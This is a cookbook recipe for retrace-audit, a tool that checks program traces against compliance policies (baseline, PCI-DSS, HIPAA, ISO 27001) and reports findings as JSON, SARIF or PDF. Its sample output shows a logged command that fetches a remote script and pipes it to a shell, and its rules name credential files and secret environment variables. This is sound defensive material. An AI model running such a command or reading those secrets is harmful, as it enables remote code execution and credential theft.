# 24 — Audit a trace for compliance violations

## Problem

You traced a binary with `retrace run`, and now you need a
defensible answer to questions like:

- Did it read `/etc/passwd`, `/etc/shadow`, or `~/.ssh/id_rsa`?
- Did it call `system()` or `popen()` (shell-injection risk)?
- Did it consult secret env vars (`*_TOKEN`, `*_KEY`, `*_PASSWORD`)?
- Did it open outbound network connections?

Reading 100K JSON log lines by hand is not the answer. `retrace-audit`
applies a JSON policy file to the trace and emits a findings report
in either human-readable JSON or SARIF 2.1.0 (the format GitHub Code
Scanning, Azure DevOps, and VS Code consume natively).

## Config

Use any retrace config that emits `log_params` for the functions
the policy cares about. The default wildcard works:

`audit-default.json`:

```json
{
  "intercept_scripts": [
    {
      "func_name": "*",
      "actions": [
        { "action_name": "log_params" },
        { "action_name": "call_real" }
      ]
    }
  ]
}
```

The policy is a separate file. retrace ships four built-in policies
in `share/policies/`:

| Policy | Rule count | What it flags |
|--------|-----------|---------------|
| `baseline.json` | 10 | File access to PII paths, `system()`, env-var leaks |
| `pci-dss.json` | 12 | PCI-DSS v4.0 control mappings (card data, audit trails) |
| `hipaa.json` | 12 | HIPAA Security Rule (PHI paths, TLS, auth) |
| `iso27001.json` | 14 | ISO/IEC 27001:2022 Annex A control mappings |

You can also write your own — the schema is six fields per rule:

```json
{
  "name": "my-policy",
  "rules": [
    {
      "id": "CUSTOM-001",
      "description": "Binary read the JWT signing key",
      "severity": "critical",
      "match": { "path_contains": "jwt-signing-key.pem" }
    }
  ]
}
```

Predicate fields (all optional; missing = wildcard):

- `func_exact` — `message.func` equals this string.
- `func_prefix` — `message.func` starts with this string.
- `path_contains` — any string value in `message` contains this substring.
- `env_pattern` — glob match against `message.name` for getenv calls
  (`*_TOKEN`, `LD_*`, exact name).

A rule matches when ALL of its non-NULL constraints match (AND).

## Invocation

### 1. Capture a trace

```sh
$ retrace run --config cookbook/audit-default.json \
    --log /tmp/trace.json \
    -- /usr/local/bin/sketchy-installer
```

### 2. Run the audit

```sh
$ retrace-audit \
    --policy share/policies/baseline.json \
    --trace /tmp/trace.json \
    --format default
```

### 3. Emit SARIF for GitHub Code Scanning

```sh
$ retrace-audit \
    --policy share/policies/pci-dss.json \
    --trace /tmp/trace.json \
    --format sarif \
    -o findings.sarif
```

Upload `findings.sarif` as a SARIF artifact to GitHub and the
findings show up in the repo's Security > Code scanning alerts UI
with file/line references and rule metadata.

## Expected output

`default` format is human-readable JSON:

```json
{
  "policy": "baseline",
  "summary": {
    "total_entries": 4823,
    "findings": 7,
    "by_severity": {"critical": 1, "high": 3, "medium": 2, "info": 1}
  },
  "findings": [
    {
      "rule_id": "BL-007",
      "severity": "critical",
      "description": "Process called system() — shell injection risk",
      "entry_index": 1247,
      "entry": { "time": 1785400000, "func": "system",
                 "args": { "command": "curl http://example.com/x.sh | sh" } }
    },
    ...
  ]
}
```

Each finding includes the rule ID, severity, description, the index
into the original trace, and the full log entry that triggered it
(for evidence).

## Variations

### Chain multiple policies

Run each policy separately and concatenate the SARIF outputs:

```sh
for p in baseline pci-dss hipaa iso27001; do
  retrace-audit \
    --policy share/policies/$p.json \
    --trace /tmp/trace.json \
    --format sarif \
    -o findings-$p.sarif
done
```

GitHub accepts multiple SARIF uploads per repo, categorized by
policy name.

### Generate a PDF report for offline review

```sh
$ retrace-audit \
    --policy share/policies/hipaa.json \
    --trace /tmp/trace.json \
    --format pdf \
    -o hipaa-audit.pdf
```

The PDF includes a cover page, executive summary, and one page per
finding (capped at 40 per page) with the rule description and
matching log entry.

### Write a custom policy for your codebase

Create `share/policies/myteam.json`:

```json
{
  "name": "myteam-baseline",
  "rules": [
    {
      "id": "TEAM-001",
      "description": "Read the production DB password file",
      "severity": "critical",
      "match": { "path_contains": "/etc/myteam/db-prod.env" }
    },
    {
      "id": "TEAM-002",
      "description": "Outbound connect to non-corporate host",
      "severity": "high",
      "match": { "func_exact": "connect" }
    }
  ]
}
```

Install it next to the built-in policies:

```sh
$ sudo cp myteam.json /usr/local/share/retrace/policies/
```

## Caveats

- `path_contains` is a substring match (case-sensitive). For
  regex-based predicates, wait for the filter DSL (TODO.complete/20).
- The matcher scans every string value in each log entry. Traces
  with very large string args (e.g. base64 blobs) may take longer.
- SARIF output includes the full log entry as evidence; large traces
  produce large SARIF files. Filter the trace with
  `RETRACE_LOGGER_ALLOWED_FUNCS` first if size matters.

## See also

- Recipe 14 — Trace `getenv()` reads (the data behind `*_TOKEN` rules).
- Recipe 15 — Capture network traffic (the data behind `connect` rules).
- Recipe 25 — Diff two traces (regression detection for audits).
- `docs/adr/` — policy schema and severity-mapping decisions.
